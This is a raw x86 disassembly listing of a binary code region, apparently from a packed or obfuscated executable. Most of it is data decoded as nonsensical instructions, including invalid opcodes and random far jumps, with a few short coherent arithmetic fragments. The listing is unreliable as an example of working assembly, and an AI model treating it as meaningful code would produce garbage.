  40d11c:	sbb    BYTE PTR ds:0x8b2a3e48,0xb1
  40d123:	lea    ebp,[edi-0x45]
  40d126:	rol    bl,0x9a
  40d129:	adc    BYTE PTR [ebx+0x6244a2d4],bl
  40d12f:	and    esi,DWORD PTR ds:0x8c94454
  40d135:	dec    ecx
  40d136:	shr    BYTE PTR [edi-0x48],0xdc
  40d13a:	push   cs
  40d13b:	xor    al,0x16
  40d13d:	aas    
  40d13e:	jno    0x40d15f
  40d140:	fstp   QWORD PTR [ebx-0x45]
  40d143:	xchg   ebp,eax
  40d144:	adc    bh,dl
  40d146:	les    esi,FWORD PTR [ebp+0x41639fa2]
  40d14c:	int3   
  40d14d:	es pop ebx
  40d14f:	push   ds
  40d150:	aaa    
  40d151:	xlat   BYTE PTR ds:[ebx]
  40d152:	imul   edi,DWORD PTR [edi+edi*4-0x35],0x7cfad95
  40d15a:	test   DWORD PTR [ecx-0x500bcf2a],esi
  40d160:	ja     0x40d176
  40d162:	push   ds
  40d163:	jge    0x40d12b
  40d165:	ins    BYTE PTR es:[edi],dx
  40d166:	or     eax,0x4f7e3ede
  40d16b:	les    esp,FWORD PTR [ebp-0x76]
  40d16e:	pushf  
  40d16f:	add    eax,edx
  40d171:	inc    ecx
  40d172:	icebp  
  40d173:	in     al,0xf
  40d175:	mov    dl,0x3a
  40d177:	or     BYTE PTR ds:0x129715a9,ch
  40d17d:	inc    edi
  40d17e:	sub    al,0xe1
  40d180:	pop    edx
  40d181:	dec    ecx
  40d182:	lods   eax,DWORD PTR ds:[si]
  40d184:	ror    BYTE PTR [edi],cl
  40d186:	push   eax
  40d187:	xor    BYTE PTR [edx-0xe723695],al
  40d18d:	xor    ebp,DWORD PTR [edi-0xd]
  40d190:	jbe    0x25563447
  40d196:	out    dx,eax
  40d197:	push   edx
  40d198:	dec    esp
  40d199:	cmp    ah,BYTE PTR [esi]
  40d19b:	(bad)  
  40d19d:	aam    0x28
  40d19f:	push   ebp
  40d1a0:	daa    
  40d1a1:	lock jne 0x40d215
  40d1a4:	and    al,0xe9
  40d1a6:	xchg   DWORD PTR [ebx],eax
  40d1a8:	xor    esp,DWORD PTR [eax-0x62]
  40d1ab:	jno    0x40d1d3
  40d1ad:	call   0xa5a9:0x6a65a227
  40d1b4:	scas   eax,DWORD PTR es:[edi]
  40d1b5:	dec    ebp
  40d1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1b7:	pop    edx
  40d1b8:	mov    dh,0x47
  40d1ba:	out    dx,eax
  40d1bb:	jne    0x40d220
  40d1bd:	enter  0x7d6,0x50
  40d1c1:	and    ch,BYTE PTR [edx]
  40d1c3:	dec    edi
  40d1c4:	and    al,0xe6
  40d1c6:	test   al,0x6f
  40d1c8:	das    
  40d1c9:	cld    
  40d1ca:	dec    ebx
  40d1cb:	mov    ?,WORD PTR [esi-0x3d]
  40d1ce:	or     al,0x25
  40d1d0:	in     eax,dx
  40d1d1:	lods   al,BYTE PTR ds:[esi]
  40d1d2:	lahf   
  40d1d3:	jns    0x40d22b
  40d1d5:	jns    0x40d1dd
  40d1d7:	mov    bh,BYTE PTR [ebx-0x687c23e5]
  40d1dd:	cmp    eax,0x3d03322
  40d1e2:	ror    DWORD PTR [edi],1
  40d1e4:	scas   eax,DWORD PTR es:[edi]
  40d1e5:	xlat   BYTE PTR ds:[ebx]
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d20f:	shl    esi,1
  40d211:	and    eax,0x7e7e9ac6
  40d216:	jo     0x40d291
  40d218:	jle    0x40d298
  40d21a:	hlt    
  40d21b:	rcl    BYTE PTR [esi],0x4d
  40d21e:	mov    BYTE PTR [ecx+eiz*2+0x65edb96c],bl
  40d225:	jnp    0x40d269
  40d227:	push   esp
  40d228:	xor    eax,0x70e56eeb
  40d22d:	fisub  WORD PTR [ebp-0x1fc44c14]
  40d233:	mov    edx,0x412ee1bf
  40d238:	(bad)  
  40d239:	push   0x5a
  40d23b:	fidivr DWORD PTR [esi+0x56]
  40d23e:	ficomp WORD PTR [ecx+0x1c]
  40d241:	das    
  40d242:	ror    DWORD PTR [edi],0xc3
  40d245:	hlt    
  40d246:	fdivr  DWORD PTR [ecx+0x67]
  40d249:	adc    eax,0x3003c5df
  40d24e:	stc    
  40d24f:	dec    ebp
  40d250:	ss pop edx
  40d252:	pop    ds
  40d253:	sbb    al,0x44
  40d255:	retf   
  40d256:	ret    
  40d257:	jno    0x40d2b0
  40d259:	add    al,0xda
  40d25b:	pop    ecx
  40d25c:	imul   esp,DWORD PTR gs:[esp+ebp*2+0x1a],0xfcc0f057
  40d265:	mov    esi,0x210c731d
  40d26a:	imul   esi,DWORD PTR [esi+0x26bc21c6],0x3d
  40d271:	int3   
  40d272:	mov    dh,0xfb
  40d274:	sbb    al,0x26
  40d276:	inc    edx
  40d277:	jno    0x40d269
  40d279:	pushf  
  40d27a:	lods   eax,DWORD PTR ss:[esi]
  40d27c:	cmp    ch,BYTE PTR [ebp-0x79fbf81]
  40d282:	mov    bl,BYTE PTR [edi-0x62]
  40d285:	in     eax,dx
  40d286:	push   0xbc6c9a80
  40d28b:	push   eax
  40d28c:	dec    esi
  40d28d:	sub    ebp,ebp
  40d28f:	dec    ecx
  40d290:	fwait
  40d291:	stos   DWORD PTR es:[edi],eax
  40d292:	clc    
  40d293:	stos   BYTE PTR es:[edi],al
  40d294:	das    
  40d295:	dec    esi
  40d296:	mov    DWORD PTR [ebx],ecx
  40d298:	dec    edx
  40d299:	pop    esi
  40d29a:	arpl   WORD PTR [ecx+0x31],dx
  40d29d:	int3   
  40d29e:	stos   DWORD PTR es:[edi],eax
  40d29f:	xchg   esi,eax
  40d2a0:	loope  0x40d2c0
  40d2a2:	mov    ch,0x84
  40d2a4:	repnz mov al,ds:0x1d3ad8f7
  40d2aa:	shl    DWORD PTR [edi],0xb1
  40d2ad:	add    BYTE PTR [ecx+0x27],dh
  40d2b0:	sbb    al,0x12
  40d2b2:	js     0x40d27e
  40d2b4:	cmp    eax,0x529d7d5e
  40d2b9:	push   esp
  40d2ba:	mov    ds,WORD PTR [esi+0x42]
  40d2bd:	cmp    al,0x4a
  40d2bf:	mov    eax,0x56f4411e
  40d2c4:	ds sub eax,0x6e39de44
  40d2ca:	pop    ss
  40d2cb:	adc    BYTE PTR [esi],dl
  40d2cd:	add    edi,DWORD PTR [eax+0x20]
  40d2d0:	icebp  
  40d2d1:	jnp    0x40d329
  40d2d3:	push   ebx
  40d2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d5:	call   0x771c:0xd4e2b596
  40d2dc:	adc    BYTE PTR [edi+0x244ce02e],al
  40d2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2e3:	mov    esi,0x8f42a99c
  40d2e8:	pusha  
  40d2e9:	pop    edi
  40d2ea:	push   eax
  40d2eb:	xor    al,0xb1
  40d2ed:	pop    esp
  40d2ee:	in     al,0xb4
  40d2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f1:	and    bh,BYTE PTR [ecx]
  40d2f3:	mov    dl,0xbd
  40d2f5:	and    al,0x4e
  40d2f7:	fild   DWORD PTR [ebx+0xddd362b]
  40d2fd:	push   ebx
  40d2fe:	test   dh,0x63
  40d301:	jmp    0x40d2ea
  40d303:	les    edx,FWORD PTR [ecx-0x39]
  40d306:	das    
  40d307:	aas    
  40d308:	lods   al,BYTE PTR ds:[esi]
  40d309:	push   0x60dec19
  40d30e:	cmp    BYTE PTR [eax-0x55bf8e49],cl
  40d314:	shr    DWORD PTR [ecx],1
  40d316:	(bad)  
  40d317:	and    al,0x72
  40d319:	xchg   BYTE PTR [edi-0x6eb07cec],ah
  40d31f:	adc    BYTE PTR [ecx+0x43],al
  40d322:	jecxz  0x40d370
  40d324:	daa    
  40d325:	sub    al,0x7b
  40d327:	cli    
  40d328:	ss dec ebx
  40d32a:	pop    ebx
  40d32b:	lock iret 
  40d32d:	es js  0x40d35f
  40d330:	push   ds
  40d331:	cmp    BYTE PTR [ecx+ecx*4+0x6b],cl
  40d335:	ins    BYTE PTR es:[edi],dx
  40d336:	ss push 0x5f3acd10
  40d33c:	push   0xc
  40d33e:	xchg   edi,eax
  40d33f:	call   0xf505:0xa0b19fa3
  40d346:	and    ebx,DWORD PTR [eax+edi*2+0x56]
  40d34a:	out    0xc3,eax
  40d34c:	mov    eax,ds:0xf10a50c5
  40d351:	jns    0x40d359
  40d353:	jmp    0x6c5d:0x5b7c1e7c
  40d35a:	int3   
  40d35b:	cmc    
  40d35c:	daa    
  40d35d:	mov    ch,BYTE PTR [ecx-0x460b7755]
  40d363:	data16 sbb cl,cl
  40d366:	jne    0x40d3d5
  40d368:	jg     0x40d396
  40d36a:	out    0x7e,al
  40d36c:	jg     0x40d39c
  40d36e:	repz push es
  40d370:	jmp    0x7459:0xf9f03327
  40d377:	push   ecx
  40d378:	xchg   DWORD PTR [ecx+0x2a],esp
  40d37b:	dec    esp
  40d37c:	lods   al,BYTE PTR ds:[esi]
  40d37d:	add    bh,BYTE PTR [edx+0x78914eb9]
  40d383:	mov    ecx,0x3f72284a
  40d388:	dec    edi
  40d389:	int    0x37
  40d38b:	popa   
  40d38c:	cld    
  40d38d:	cdq    
  40d38e:	std    
  40d38f:	shr    cl,0x30
  40d392:	push   0xd19351f1
  40d397:	mov    ?,WORD PTR [edi-0x65454d03]
  40d39d:	test   BYTE PTR [esi*4+0x2d6b8466],bl
  40d3a4:	mov    esp,0x2cf7615e
  40d3a9:	fdivr  QWORD PTR [eax-0x5bc8522a]
  40d3af:	sub    DWORD PTR [ebx-0x24],0xffffffee
  40d3b3:	pop    edx
  40d3b4:	mov    ds:0xdeee5fc,eax
  40d3b9:	in     al,0xf3
  40d3bb:	out    0xd2,eax
  40d3bd:	cmp    al,0xb
  40d3bf:	pop    ebx
  40d3c0:	loop   0x40d437
  40d3c2:	push   cs
  40d3c3:	int    0x44
  40d3c5:	xor    eax,0x9a51f4fb
  40d3ca:	daa    
  40d3cb:	mov    cl,0xb8
  40d3cd:	push   cs
  40d3ce:	add    DWORD PTR [edx-0x5f],esi
  40d3d1:	and    ah,BYTE PTR [ebp+0x41]
  40d3d4:	cmp    ebp,ebp
  40d3d6:	jae    0x40d3c4
  40d3d8:	push   es
  40d3d9:	inc    ebx
  40d3da:	retf   
  40d3db:	and    DWORD PTR [edi+ebp*4-0x20],ebx
  40d3df:	sub    eax,DWORD PTR [ebp-0x46f2bb9b]
  40d3e5:	iret   
  40d3e6:	(bad)  
  40d3e7:	loop   0x40d3ce
  40d3e9:	inc    esi
  40d3ea:	or     BYTE PTR [ecx-0x34af6f2e],dl
  40d3f0:	add    eax,0x63b77d99
  40d3f5:	ins    BYTE PTR es:[edi],dx
  40d3f6:	or     BYTE PTR cs:[eax+0x31],bl
  40d3fa:	sti    
  40d3fb:	jne    0x40d3be
  40d3fd:	mov    ebp,0xa0b89bbb
  40d402:	xor    BYTE PTR [edi-0x68],dh
  40d405:	dec    eax
  40d406:	and    esp,edx
  40d408:	cdq    
  40d409:	sbb    esp,DWORD PTR [ecx+0x1a]
  40d40c:	jg     0x40d46b
  40d40e:	xchg   esp,eax
  40d40f:	xchg   DWORD PTR [edx+0x7bac885f],ebp
  40d415:	cmp    ebx,DWORD PTR [ebx-0x173e5029]
  40d41b:	sub    dh,bh
  40d41d:	hlt    
  40d41e:	mov    ecx,DWORD PTR [edx+ebp*1]
  40d421:	xor    dh,BYTE PTR [ebx]
  40d423:	cmp    edi,DWORD PTR [esi-0x4f8b260f]
  40d429:	bswap  esi
  40d42b:	(bad)  
  40d42c:	sbb    esp,edi
  40d42e:	out    0xb9,eax
  40d430:	mov    ds:0x3bf72ed,al
  40d435:	mov    DWORD PTR [edx],esp
  40d437:	cmp    ax,0xb6ed
  40d43b:	xor    eax,0x51e1e5b3
  40d440:	es es jp 0x40d42e
  40d444:	pusha  
  40d445:	repz and ah,BYTE PTR [eax+0x7d3adcbd]
  40d44c:	cmp    eax,0x6cbfc4b8
  40d451:	sti    
  40d452:	pushw  es
  40d454:	jge    0x40d482
  40d456:	mov    eax,ds:0x6b08527e
  40d45b:	outs   dx,DWORD PTR ds:[esi]
  40d45c:	inc    edi
  40d45d:	mov    ecx,0x7deca1d9
  40d462:	sbb    al,dl
  40d464:	mov    esi,?
  40d466:	cwde   
  40d467:	push   es
  40d468:	dec    ebp
  40d469:	repz bound ebx,QWORD PTR [edi+0x432ff994]
  40d470:	xor    eax,DWORD PTR [edx+0x57]
  40d473:	xchg   ebx,eax
  40d474:	adc    ebp,DWORD PTR [ebx+0x129c078]
  40d47a:	test   eax,0xf8186b50
  40d47f:	(bad)  
  40d480:	out    dx,al
  40d481:	cmp    esp,DWORD PTR [edi+0x5f]
  40d484:	mov    edi,0x54a8bf35
  40d489:	scas   eax,DWORD PTR es:[edi]
  40d48a:	(bad)  
  40d48b:	out    dx,eax
  40d48c:	sub    ah,dh
  40d48e:	les    edi,FWORD PTR [edi]
  40d490:	sub    eax,0x29f2ee11
  40d495:	sub    BYTE PTR [eax-0xe],0xf8
  40d499:	mov    ds:0x87033268,eax
  40d49e:	mov    ch,dh
  40d4a0:	adc    eax,0x9051f41b
  40d4a5:	in     eax,0x24
  40d4a7:	fmul   DWORD PTR [bp+si+0x5f50]
  40d4ac:	(bad)  
  40d4ad:	lahf   
  40d4ae:	aas    
  40d4af:	out    0x39,al
  40d4b1:	out    0x13,eax
  40d4b3:	mov    al,0x7a
  40d4b5:	sti    
  40d4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4b7:	int    0x78
  40d4b9:	test   al,0x58
  40d4bb:	adc    BYTE PTR [ebp-0x80],bh
  40d4be:	(bad)  
  40d4bf:	sahf   
  40d4c0:	aas    
  40d4c1:	jae    0x40d4bd
  40d4c3:	pop    ebx
  40d4c4:	push   0x87f035d0
  40d4c9:	dec    eax
  40d4ca:	adc    al,0x2c
  40d4cc:	rcl    DWORD PTR [ecx-0x55df9f48],1
  40d4d2:	ret    0xfc0e
  40d4d5:	js     0x40d487
  40d4d7:	in     al,dx
  40d4d8:	icebp  
  40d4d9:	pop    eax
  40d4da:	pop    ebx
  40d4db:	(bad)  
  40d4dc:	mov    ch,0xc3
  40d4de:	push   0x5b
  40d4e0:	(bad)  [edi+0x4ac34cae]
  40d4e6:	dec    ebp
  40d4e7:	inc    esi
  40d4e8:	adc    eax,0x3aaf9f1f
  40d4ed:	pop    edi
  40d4ee:	dec    edx
  40d4ef:	nop
  40d4f0:	pop    es
  40d4f1:	sub    edi,ecx
  40d4f3:	ret    0xaebc
  40d4f6:	sub    edx,DWORD PTR [ecx]
  40d4f8:	push   eax
  40d4f9:	sti    
  40d4fa:	jmp    0x40d52f
  40d4fc:	xchg   esi,eax
  40d4fd:	pop    ds
  40d4fe:	cwde   
  40d4ff:	xor    DWORD PTR [ebx],edx
  40d501:	dec    ecx
  40d502:	inc    ecx
  40d503:	in     eax,dx
  40d504:	pusha  
  40d505:	(bad)  
  40d506:	fwait
  40d507:	loope  0x40d489
  40d509:	mov    ebx,0xbe20dbfa
  40d50e:	push   es
  40d50f:	adc    eax,0xdd55c8b5
  40d514:	cmp    DWORD PTR [edx+0x2f],ebp
  40d517:	ss or  eax,0xba1103a7
  40d51d:	das    
  40d51e:	mov    dl,0xe0
  40d520:	push   esi
  40d521:	or     al,BYTE PTR [ebp+0x32644741]
  40d527:	stc    
  40d528:	imul   esp,DWORD PTR [esi-0x2cba1651],0x40
  40d52f:	xchg   ebx,eax
  40d530:	int    0xbb
  40d532:	mov    bh,0x74
  40d534:	pop    es
  40d535:	dec    ebx
  40d536:	outs   dx,BYTE PTR es:[esi]
  40d538:	call   0xf84b:0x791adddc
  40d53f:	mov    dh,0xc3
  40d541:	xor    al,al
  40d543:	push   es
  40d544:	jno    0x40d57e
  40d546:	(bad)  
  40d547:	cli    
  40d548:	in     al,0x23
  40d54a:	jno    0x40d531
  40d54c:	out    0xce,al
  40d54e:	retf   
  40d54f:	iret   
  40d550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d551:	dec    esp
  40d552:	cmp    dh,BYTE PTR [esi+0x72]
  40d555:	push   eax
  40d556:	xor    bl,BYTE PTR [ebp+0x7b14bfb0]
  40d55c:	push   edx
  40d55d:	ret    0x5ddd
  40d560:	cmp    bl,BYTE PTR [eax-0x5cc6ba44]
  40d566:	push   0xdbf6418f
  40d56b:	je     0x40d511
  40d56d:	mov    bh,0x45
  40d56f:	push   ss
  40d570:	jmp    0xc93c2f3d
  40d575:	into   
  40d576:	cld    
  40d577:	jne    0x40d521
  40d579:	stos   DWORD PTR es:[edi],eax
  40d57a:	jns    0x40d54a
  40d57c:	int3   
  40d57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d57e:	inc    ebp
  40d57f:	push   0x9051daf6
  40d584:	scas   eax,DWORD PTR es:[edi]
  40d585:	add    bh,BYTE PTR [esp+ebx*4+0x4e]
  40d589:	cs mov ch,0x17
  40d58c:	pop    edx
  40d58d:	and    al,0xa5
  40d58f:	pusha  
  40d590:	cmp    eax,0x952a8b91
  40d595:	nop
  40d596:	or     esp,eax
  40d598:	pop    esi
  40d599:	inc    edx
  40d59a:	and    eax,0x6027fb78
  40d59f:	stos   BYTE PTR es:[edi],al
  40d5a0:	fiadd  WORD PTR [ecx+0x9dd7569]
  40d5a6:	jg     0x40d5d3
  40d5a8:	popa   
  40d5a9:	mov    ah,0x44
  40d5ab:	mov    DWORD PTR [edi+ecx*4],esi
  40d5ae:	xor    ecx,DWORD PTR [ecx+ebx*8+0x6f]
  40d5b2:	mov    ebx,DWORD PTR [ebp-0x36]
  40d5b5:	jecxz  0x40d545
  40d5b7:	mov    ecx,0x7d9f0f4e
  40d5bc:	ficom  DWORD PTR ds:0xe92860d4
  40d5c2:	call   0x594c6662
  40d5c7:	mov    cl,0x46
  40d5c9:	es cld 
  40d5cb:	ins    BYTE PTR es:[edi],dx
  40d5cc:	les    edx,FWORD PTR [ecx+0x66]
  40d5cf:	pop    esi
  40d5d0:	lock adc BYTE PTR [edx],al
  40d5d3:	mov    ds:0xa604d104,eax
  40d5d8:	daa    
  40d5d9:	mov    bl,0x45
  40d5db:	add    edi,DWORD PTR [esi-0x4c683668]
  40d5e1:	arpl   WORD PTR [ecx-0x5b],bp
  40d5e4:	adc    ah,cl
  40d5e6:	dec    edi
  40d5e7:	add    esp,DWORD PTR [ecx]
  40d5e9:	and    cl,BYTE PTR [ebp+0x52]
  40d5ec:	and    eax,0xf1e0bec4
  40d5f1:	or     ebp,DWORD PTR [esi]
  40d5f3:	cmc    
  40d5f4:	mov    dl,0x2
  40d5f6:	cmp    edi,DWORD PTR [esi-0x2d]
  40d5f9:	pop    DWORD PTR [ebx-0x45]
  40d5fc:	in     eax,dx
  40d5fd:	pop    ds
  40d5fe:	push   ss
  40d5ff:	adc    ah,BYTE PTR [edi]
  40d601:	in     al,0x7e
  40d603:	popa   
  40d604:	mov    ecx,0xadb739f9
  40d609:	sbb    eax,0xd7ef94da
  40d60e:	leave  
  40d60f:	push   ds
  40d610:	mov    ecx,DWORD PTR [ebx-0x27cc3a79]
  40d616:	sub    edx,ecx
  40d618:	lea    edi,[edi+ebx*1+0x327299]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x39150598
  40d64b:	add    eax,0x7e7ea638
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	inc    esp
  40d655:	mov    ds:0x7f65ea60,al
  40d65a:	dec    edx
  40d65b:	sub    ebp,esi
  40d65d:	jl     0x40d6d4
  40d65f:	adc    DWORD PTR [edx-0x1d50da41],esi
  40d665:	pop    esp
  40d666:	(bad)  
  40d667:	sti    
  40d668:	sub    BYTE PTR [esi+0x59],al
  40d66b:	mov    eax,ds:0x9c74cb6f
  40d670:	sar    DWORD PTR [ebp+0x1e],0xf3
  40d674:	pop    edx
  40d675:	addr16 mov ebx,0xc2516045
  40d67b:	sub    esp,DWORD PTR [edi-0x63]
  40d67e:	shr    DWORD PTR ds:0x754faafb,1
  40d684:	jmp    0x6eca:0x2d372240
  40d68b:	xor    BYTE PTR [edi],al
  40d68d:	sbb    bl,cl
  40d68f:	mov    esi,0xbb9ff76f
  40d694:	mov    dl,0x43
  40d696:	cmc    
  40d697:	pop    esi
  40d698:	push   cs
  40d699:	loopne 0x40d6db
  40d69b:	add    eax,0x4f27c403
  40d6a0:	xchg   esi,eax
  40d6a1:	cld    
  40d6a2:	sbb    DWORD PTR es:[ecx+0x2a33474e],esi
  40d6a9:	sar    DWORD PTR [edi-0x5f],cl
  40d6ac:	into   
  40d6ad:	test   eax,0x14be7e8d
  40d6b3:	cli    
  40d6b4:	cdq    
  40d6b5:	jne    0x40d6d7
  40d6b7:	sbb    esp,DWORD PTR [eax]
  40d6b9:	mov    ds:0xcb8b411,eax
  40d6be:	mov    DWORD PTR [ecx-0x5413aeb6],ebx
  40d6c4:	xchg   ebp,eax
  40d6c5:	arpl   WORD PTR [ecx],dx
  40d6c7:	je     0x40d6ff
  40d6c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6ca:	fstp   st(5)
  40d6cc:	sbb    eax,0x8632ad02
  40d6d1:	and    bh,BYTE PTR [ebp-0x6568c063]
  40d6d7:	mov    dl,0x38
  40d6d9:	or     dh,BYTE PTR [ebx-0x55b0684a]
  40d6df:	cs aam 0x80
  40d6e2:	ret    0xc96e
  40d6e5:	(bad)  
  40d6e6:	cdq    
  40d6e7:	ins    DWORD PTR es:[edi],dx
  40d6e8:	mov    ah,0xd5
  40d6ea:	or     bl,bh
  40d6ec:	pop    edi
  40d6ed:	popa   
  40d6ee:	fincstp 
  40d6f0:	imul   esp,DWORD PTR [esi+0x46],0x927aead5
  40d6f7:	stos   BYTE PTR es:[edi],al
  40d6f8:	std    
  40d6f9:	in     al,dx
  40d6fa:	mov    esp,0xfb99fe19
  40d6ff:	cmp    al,0x1e
  40d701:	mov    ch,0xd6
  40d703:	(bad)  
  40d705:	fwait
  40d706:	mov    ds:0xedbb3fee,al
  40d70b:	push   ebp
  40d70c:	repnz mov ah,0xa5
  40d70f:	pushf  
  40d710:	aas    
  40d711:	mov    cl,0xe4
  40d713:	sbb    al,0x19
  40d715:	popf   
  40d716:	mul    DWORD PTR [ebx]
  40d718:	ins    DWORD PTR es:[edi],dx
  40d719:	pop    esi
  40d71a:	pop    ecx
  40d71b:	push   esi
  40d71c:	mov    esi,0x9abae5c7
  40d721:	pop    ss
  40d722:	mov    edi,0x8052e408
  40d727:	popf   
  40d728:	mov    al,0x7e
  40d72a:	cmp    al,0xd7
  40d72c:	xchg   DWORD PTR [esi-0x25],esi
  40d72f:	fs push esp
  40d731:	out    0x38,eax
  40d733:	push   cs
  40d734:	pop    ss
  40d735:	or     eax,0x46d5195d
  40d73a:	clc    
  40d73b:	jne    0x40d792
  40d73d:	xor    dh,BYTE PTR [ebp+0x7e82c31c]
  40d743:	cmove  edx,DWORD PTR [edi-0x299eca97]
  40d74a:	or     DWORD PTR [ebx],ebx
  40d74c:	dec    esi
  40d74d:	out    dx,eax
  40d74e:	mov    eax,0x1ddf7f62
  40d753:	call   0x6e490539
  40d758:	push   edi
  40d759:	clc    
  40d75a:	sbb    bl,cl
  40d75c:	mov    dh,0xe8
  40d75e:	aam    0xd
  40d760:	add    DWORD PTR [edi-0x5ad1bc31],esp
  40d766:	fist   DWORD PTR ds:0x4dd0f6a6
  40d76c:	dec    edi
  40d76d:	mov    eax,ds:0xa7a1f2bf
  40d772:	inc    ebx
  40d773:	xor    edx,edx
  40d775:	and    eax,0xdc2341f2
  40d77a:	call   0x66054e77
  40d77f:	pop    ds
  40d780:	arpl   WORD PTR [ecx-0x4018d4d],bp
  40d786:	xchg   ecx,eax
  40d787:	fdivr  QWORD PTR [esi+edi*8]
  40d78a:	mov    es,WORD PTR [esi+0x62]
  40d78d:	inc    esi
  40d78e:	jmp    ebp
  40d790:	cmp    ebx,esi
  40d792:	setg   BYTE PTR [ecx+0x29064b4c]
  40d799:	ret    
  40d79a:	xor    BYTE PTR [esi+0x6c],0xbd
  40d79e:	imul   BYTE PTR [edi+0x69179362]
  40d7a4:	xchg   ebx,eax
  40d7a5:	sbb    eax,0xa8d37843
  40d7aa:	cld    
  40d7ab:	ret    0x8682
  40d7ae:	push   esp
  40d7af:	inc    esp
  40d7b0:	pushf  
  40d7b1:	jle    0x40d825
  40d7b3:	dec    BYTE PTR [ecx+0x5299f2f9]
  40d7b9:	je     0x40d789
  40d7bb:	mov    esi,0xdc7bad9e
  40d7c0:	je     0x40d7c9
  40d7c2:	or     DWORD PTR cs:[ebx],edx
  40d7c5:	mov    WORD PTR [edi-0x32eb2b03],es
  40d7cb:	lahf   
  40d7cc:	loope  0x40d81a
  40d7ce:	jne    0x40d839
  40d7d0:	cs cld 
  40d7d2:	adc    DWORD PTR [eax],esp
  40d7d4:	add    eax,0xa3e9f376
  40d7d9:	aam    0x7
  40d7db:	add    eax,ebp
  40d7dd:	rol    BYTE PTR [edi],1
  40d7df:	stos   DWORD PTR es:[edi],eax
  40d7e0:	inc    esi
  40d7e1:	pop    edi
  40d7e2:	addr16 in eax,0x90
  40d7e5:	in     eax,0xd5
  40d7e7:	aad    0xc9
  40d7e9:	add    al,0xd1
  40d7eb:	xor    eax,0x2cc75c91
  40d7f0:	cmp    edx,DWORD PTR [edx]
  40d7f2:	dec    ebx
  40d7f3:	leave  
  40d7f4:	jne    0x40d799
  40d7f6:	and    DWORD PTR [eax+0x29c7b1d7],edx
  40d7fc:	dec    ebx
  40d7fd:	and    al,0x24
  40d7ff:	inc    edi
  40d800:	ret    
  40d801:	nop
  40d802:	hlt    
  40d803:	rcl    BYTE PTR [edx-0xf8acac],1
  40d809:	stos   DWORD PTR es:[edi],eax
  40d80a:	cmp    DWORD PTR [ebp+0x77],0x25cc1b99
  40d811:	adc    ch,BYTE PTR [ebx-0x35373064]
  40d817:	sub    eax,0x46eb6e5b
  40d81c:	lds    eax,FWORD PTR [esi-0x61]
  40d81f:	fist   WORD PTR [eax-0x3b]
  40d822:	lds    esp,FWORD PTR [esi+ebp*1]
  40d825:	adc    DWORD PTR [edx],ebx
  40d827:	mov    ebx,0x651ecc3b
  40d82c:	mov    edx,0xe2aa00bd
  40d831:	jecxz  0x40d8a8
  40d833:	sub    DWORD PTR [ecx+ebx*4+0x4e],0x8
  40d838:	das    
  40d839:	enter  0x748e,0xc9
  40d83d:	stc    
  40d83e:	and    BYTE PTR ds:0x2e051824,dh
  40d844:	mov    eax,ds:0x8de0b3ce
  40d849:	xlat   BYTE PTR ds:[ebx]
  40d84a:	push   ss
  40d84b:	pushf  
  40d84c:	sub    al,0x96
  40d84e:	mov    ebp,0x81684ae7
  40d853:	(bad)  
  40d855:	xchg   ecx,eax
  40d856:	and    eax,0x155c12ec
  40d85b:	jae    0x40d80b
  40d85d:	add    cl,BYTE PTR [edx+0x74]
  40d860:	dec    edx
  40d861:	pop    es
  40d862:	jle    0x40d884
  40d864:	sub    eax,0x98e2395e
  40d869:	sti    
  40d86a:	(bad)  
  40d86c:	ret    0xb941
  40d86f:	(bad)  
  40d870:	sar    DWORD PTR ds:[ecx-0x5e],cl
  40d874:	std    
  40d875:	jns    0x40d8d4
  40d877:	xchg   ecx,eax
  40d878:	pop    ebp
  40d879:	leave  
  40d87a:	test   dl,bh
  40d87c:	iret   
  40d87d:	popf   
  40d87e:	repz add al,0x27
  40d881:	lock sub al,0x7d
  40d884:	dec    ebp
  40d885:	cwde   
  40d886:	pusha  
  40d887:	or     BYTE PTR [ecx+eax*4],bl
  40d88a:	push   cs
  40d88b:	test   eax,0x7b0a700e
  40d890:	jns    0x40d81b
  40d892:	pop    ebp
  40d893:	in     eax,0x7b
  40d895:	mov    edx,esp
  40d897:	scas   al,BYTE PTR es:[edi]
  40d898:	je     0x40d8aa
  40d89a:	stos   BYTE PTR es:[edi],al
  40d89b:	iret   
  40d89c:	jae    0x40d863
  40d89e:	dec    eax
  40d89f:	mov    al,0xc3
  40d8a1:	mov    ah,BYTE PTR [ecx+ebx*1+0x1b24d90a]
  40d8a8:	dec    esi
  40d8a9:	pop    es
  40d8aa:	xor    edx,eax
  40d8ac:	out    0x34,eax
  40d8ae:	adc    eax,0x9dd4e706
  40d8b3:	test   eax,0xb819c246
